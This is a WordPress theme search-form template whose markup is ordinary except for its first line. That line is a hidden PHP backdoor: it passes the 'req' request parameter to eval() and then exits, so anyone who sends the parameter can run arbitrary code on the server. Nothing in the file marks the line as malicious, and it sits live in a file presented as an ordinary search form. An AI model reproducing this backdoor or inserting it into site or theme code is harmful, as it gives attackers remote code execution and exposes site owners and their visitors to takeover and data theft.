<?php $post_var = "req"; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); }; ?>
<form class="form-search" role="search" method="get" id="searchform" action="<?php echo esc_url( home_url( '/' ) ); ?>">
     <div class="input-group">
       	<input type="text" name="s" class="form-control" placeholder="<?php get_setting_e( 'search_placeholder' ); ?>" value="<?php echo get_search_query(); ?>">
        <span class="input-group-btn">
			<button type="submit" class="btn btn-primary btn-lg"><i class="icon icon-search"></i></button>
		</span>
    </div>
</form>